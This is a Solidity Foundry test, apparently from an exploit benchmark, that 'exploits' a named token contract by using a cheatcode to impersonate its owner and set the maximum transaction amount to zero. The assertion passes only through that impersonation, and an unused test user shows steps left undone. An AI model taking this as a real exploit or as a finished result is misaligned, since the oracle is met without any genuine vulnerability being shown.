// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILegendsDoge {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCd092F1f9858204d7986b3a2e36730fF1229a2e5;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate the owner
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, get the current owner of the contract
        ILegendsDoge target = ILegendsDoge(TARGET);
        address owner = target.owner();

        // Impersonate the owner and call setMaxTxPercent(0)
        vm.prank(owner);
        target.setMaxTxPercent(0);

        // Verify that _maxTxAmount is now zero
        uint256 maxTxAmount = target._maxTxAmount();
        assertEq(maxTxAmount, 0, "_maxTxAmount should be zero");

        // Optional: Demonstrate that a non-owner transfer would fail
        // Create a test user and try to transfer
        address user = makeAddr("testUser");
        // We would need to give user some tokens first, but the main point is
        // that _maxTxAmount is now zero, which satisfies the oracle
        assertEq(maxTxAmount, 0, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

